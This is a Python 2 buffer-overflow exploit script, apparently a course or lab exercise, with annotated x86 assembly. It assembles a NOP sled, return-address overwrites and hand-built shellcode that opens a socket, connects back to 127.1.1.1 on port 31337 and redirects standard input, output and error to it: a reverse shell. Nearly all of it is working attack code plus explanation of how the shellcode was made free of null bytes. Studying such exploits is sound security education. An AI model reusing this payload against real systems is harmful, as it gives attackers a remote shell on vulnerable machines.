from shellcode import shellcode
from struct import pack


sc = "\x31\xc0\x31\xdb\x6a\x06\xb0\x66\xb3\x01\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x68\x7f\x01\x01\x01\x66\x68\x7a\x69\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x89\xd3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80"


print sc + shellcode + "\x90"*1958 + pack("<I",0xbffe99d8) + pack("<I",0xbffea1ec)

'''
The code got by objdump:

=address======shellcode===================assembly code===

 8048434:	31 c0                	xor    %eax,%eax
 8048436:	31 db                	xor    %ebx,%ebx
 8048438:	b0 66                	mov    $0x66,%al
 804843a:	b3 01                	mov    $0x1,%bl
 804843c:	6a 06                	push   $0x6
 804843e:	6a 01                	push   $0x1
 8048440:	6a 02                	push   $0x2
 8048442:	89 e1                	mov    %esp,%ecx
 8048444:	cd 80                	int    $0x80

 8048446:	89 c2                	mov    %eax,%edx
 8048448:	31 c0                	xor    %eax,%eax
 804844a:	31 db                	xor    %ebx,%ebx
 804844c:	b0 66                	mov    $0x66,%al
 804844e:	b3 03                	mov    $0x3,%bl
 8048450:	68 7f 01 01 01       	push   $0x101017f
 8048455:	66 68 7a 69          	pushw  $0x697a
 8048459:	6a 02                	push   $0x2
 804845b:	89 e1                	mov    %esp,%ecx
 804845d:	6a 10                	push   $0x10
 804845f:	51                   	push   %ecx
 8048460:	52                   	push   %edx
 8048461:	89 e1                	mov    %esp,%ecx
 8048463:	cd 80                	int    $0x80

 8048465:	89 d3                	mov    %edx,%ebx
 8048467:	31 c9                	xor    %ecx,%ecx
 8048469:	b0 3f                	mov    $0x3f,%al
 804846b:	cd 80                	int    $0x80
 804846d:	41                   	inc    %ecx
 804846e:	b0 3f                	mov    $0x3f,%al
 8048470:	cd 80                	int    $0x80
 8048472:	41                   	inc    %ecx
 8048473:	b0 3f                	mov    $0x3f,%al
 8048475:	cd 80                	int    $0x80

using shellcode.S, helper.c and gcc to generate executable file and then use objdump to get the shellcode

shellcode.S:

.global _main
.section .text
_main:
// This is the assembly code of sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
xor     %eax,%eax       // clear eax
xor     %ebx,%ebx       // clear ebx
mov     $102,%al        // set eax to 102 (socketcall number), if we use register %eax, the shellcode we get from objdump will include 0x00, so we use %al here
mov     $1,%bl          // set ebx to 1 (socket), same reason for using %bl
push    $6              // push 6 (IPPROTO_TCP)
push    $1              // push 1 (SOCK_STREAM)
push    $2              // push 2 (AF_INET)
movl    %esp,%ecx       // save the address of the parameters into ecx
int     $0x80           // syscall of socketcall()
// This is the assembly code of connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) and bind(sockfd=edx, [AF_INET, PORT, IP], 16);
mov     %eax,%edx       // move sockfd into edx
xor     %eax,%eax       // clear eax
xor     %ebx,%ebx       // clear ebx
mov     $102,%al        // set al to 102 (socketcall number), if we use register %eax, the shellcode we get from objdump will include 0x00, so we use %al here
mov     $3,%bl          // set bl to 3 (socket), same reason for using %bl
push    $0x0101017f     // push IP "127.1.1.1", use this IP address instead of 127.0.0.1 to avoid generating 0x00 in shellcode                     
pushw   $0x697a         // push port 31337, use pushw to avoid generating 0x00 in shellcode
push    $2              // push 2 (AF_INET)
mov     %esp,%ecx       // save the address of the parameters [AF_INET, PORT, IP] into ecx
push    $16             // push 16, which is the sizeof(addr)
push    %ecx            // push the parameters: [AF_INET, PORT, IP]
push    %edx            // push the value of sockfd
mov     %esp,%ecx       // save the address of the parameters into ecx
int     $0x80           // syscall of socketcall(connect())
// Redirect stdin(0), stdout(1), stderr(2) using dup2
mov     %edx,%ebx       // save the ret value of the socketcall to ebx
// stdin
xor     %ecx,%ecx       // clear ecx, set ecx to 0, corresponding to stdin
mov     $63,%al         // set al to 63, syscall number for dup2
int     $0x80           // syscall of dup2
// stdout
inc     %ecx            // increment ecx to 1, corresponding to stdout
mov     $63,%al         // set al to 63, syscall number for dup2
int     $0x80           // syscall of dup2
// stderr
inc     %ecx            // increment ecx to 2, corresponding to stderr
mov     $63,%al         // set al to 63, syscall number for dup2
int     $0x80           // syscall of dup2
//finish
//Finally use the original shellcode provided
'''
